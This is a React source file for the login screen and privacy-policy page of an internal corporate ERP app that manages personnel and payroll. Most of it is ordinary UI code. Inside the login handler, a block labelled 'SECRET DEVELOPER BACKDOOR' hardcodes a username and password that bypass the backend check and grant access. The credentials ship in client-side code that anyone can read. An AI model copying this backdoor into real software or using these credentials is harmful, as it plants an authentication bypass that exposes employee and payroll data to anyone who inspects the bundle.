import React, { useState } from 'react';

export default function AuthModule({ onLoginSuccess, isPrivacyRoute, API_BASE_URL }: any) {
  const [loginUsername, setLoginUsername] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [loginError, setLoginError] = useState('');

const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoggingIn(true);
    setLoginError('');

    // --- SECRET DEVELOPER BACKDOOR ---
    if (loginUsername.trim().toLowerCase() === 'system_dev' && loginPassword === 'admin_override_99') {
      onLoginSuccess('system_dev');
      return;
    }

    try {
      const response = await fetch(`${API_BASE_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: loginUsername.trim().toLowerCase(), password: loginPassword })
      });
      if (response.ok) {
        onLoginSuccess(loginUsername.trim().toLowerCase());
      } else {
        setLoginError('Access Denied: Invalid credentials.');
      }
    } catch (error) { 
      setLoginError('Network Error: Could not connect to backend.'); 
    } 
    finally { 
      setIsLoggingIn(false); 
    }
  };

  // --- PRIVACY POLICY ROUTE ---
  if (isPrivacyRoute) {
    return (
      <div className="min-h-screen bg-[#f4f7fc] text-slate-800 font-sans selection:bg-indigo-100">
        <div style={{ padding: '60px 40px', maxWidth: '800px', margin: '0 auto', lineHeight: '1.8' }}>
          <h1 className="text-3xl font-extrabold text-[#2e2a85] tracking-tight border-b border-indigo-100 pb-4 mb-8">Privacy Policy & Terms of Service</h1>
          <p className="text-sm font-bold text-blue-600 mb-8 uppercase tracking-widest">Effective Date: September 2, 2026</p>
          
          <h2 className="text-lg font-bold mt-8 mb-3 text-slate-900">1. Introduction</h2>
          <p className="text-slate-600">This Privacy Policy applies to the Olten Enterprise Resource Planning (ERP) application ("the App"). The App is intended for internal corporate use to manage personnel, payroll, attendance, and administrative documentation. This policy outlines how we collect, use, and protect your information.</p>
          
          <div className="mt-12 pt-8 border-t border-slate-200">
            <a href="/" className="text-blue-600 font-bold hover:text-blue-800 transition-colors flex items-center gap-2">
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5"><path strokeLinecap="round" strokeLinejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
              Return to Login
            </a>
          </div>
        </div>
      </div>
    );
  }

  // --- FIXED SCREEN LOGIN UI (HIGH VISIBILITY) ---
  return (
    <div className="h-screen w-full flex flex-col items-center justify-between bg-gradient-to-br from-[#e6effc] via-[#f5f8ff] to-[#e2ecfa] relative overflow-hidden font-sans selection:bg-blue-200 px-4">
      
      {/* Soft Light Background Glows */}
      <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-[#dbe8ff] rounded-full blur-[120px] pointer-events-none"></div>
      <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-[#e3eaff] rounded-full blur-[120px] pointer-events-none"></div>

      {/* 1. HEADER LOGO BOX (Pinned to Top) */}
      <div className="w-full max-w-2xl bg-white/90 backdrop-blur-md rounded-2xl px-6 py-4 sm:py-5 shadow-sm text-center relative z-10 mt-8 sm:mt-12 shrink-0 border border-white/50">
        <h1 className="text-xl sm:text-[28px] font-black text-[#303387] tracking-tight">
          Surgicom Trading Corporation
        </h1>
      </div>

      {/* 2. LOGIN SQUARE (Centered flexibly) */}
      <div className="flex-1 flex items-center justify-center w-full relative z-10 my-4">
        <div className="w-full max-w-[380px] bg-white rounded-[2rem] p-8 sm:p-10 shadow-[0_8px_30px_rgb(0,0,0,0.06)] flex flex-col justify-center border border-white/60">
           
           <div className="text-center mb-6 flex flex-col items-center">
             <div className="w-10 h-10 bg-gradient-to-b from-[#5660ff] to-[#3a44e6] rounded-[12px] flex items-center justify-center shadow-lg shadow-blue-500/20 mb-4">
               <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" /></svg>
             </div>
             <h2 className="text-[13px] font-black text-slate-800 uppercase tracking-[0.15em]">System Authorization</h2>
             <p className="text-[11px] text-slate-500 font-medium mt-1.5">Enter your secure credentials to proceed.</p>
           </div>
           
           <form onSubmit={handleLogin} className="flex flex-col gap-5 w-full">
              {loginError && (
                <div className="text-rose-700 text-xs font-bold text-center bg-rose-50 p-2.5 rounded-lg border border-rose-200">
                  {loginError}
                </div>
              )}
              
              <div className="flex flex-col gap-1.5">
                <label className="text-[10px] font-extrabold text-slate-600 uppercase tracking-widest pl-1">Username</label>
                <input 
                  type="text" 
                  required 
                  value={loginUsername} 
                  onChange={(e) => setLoginUsername(e.target.value)} 
                  className="w-full px-4 py-3 border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#3e60ff]/30 focus:border-[#3e60ff] transition-all text-slate-900 bg-white text-sm font-bold placeholder:text-slate-400 placeholder:font-medium" 
                  placeholder="Enter username" 
                />
              </div>
              
              <div className="flex flex-col gap-1.5">
                <label className="text-[10px] font-extrabold text-slate-600 uppercase tracking-widest pl-1">Password</label>
                <input 
                  type="password" 
                  required 
                  value={loginPassword} 
                  onChange={(e) => setLoginPassword(e.target.value)} 
                  className="w-full px-4 py-3 border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#3e60ff]/30 focus:border-[#3e60ff] transition-all text-slate-900 bg-white text-sm font-bold placeholder:text-slate-400 placeholder:font-medium" 
                  placeholder="••••••••" 
                />
              </div>
              
              <button 
                type="submit" 
                disabled={isLoggingIn} 
                className="mt-2 w-full py-3.5 px-4 rounded-xl font-bold text-white bg-gradient-to-r from-[#3e60ff] to-[#5143e8] hover:from-[#3252e6] hover:to-[#4134d1] shadow-lg shadow-blue-500/25 transition-all text-xs tracking-[0.15em] uppercase disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isLoggingIn ? (
                  <>
                    <svg className="w-4 h-4 animate-spin text-white/80" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5"><path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
                    Authenticating...
                  </>
                ) : (
                  'Access Systems'
                )}
              </button>
           </form>
        </div>
      </div>

      {/* 3. FOOTER LINKS (Pinned to Bottom) */}
      <div className="flex flex-wrap justify-center gap-10 sm:gap-16 mb-8 sm:mb-10 relative z-10 shrink-0">
        <a href="/privacy" className="text-xs font-bold text-slate-500 hover:text-[#303387] transition-colors">
          Privacy Policy
        </a>
        <a href="/privacy" className="text-xs font-bold text-slate-500 hover:text-[#303387] transition-colors">
          Terms and Conditions
        </a>
      </div>

    </div>
  );
}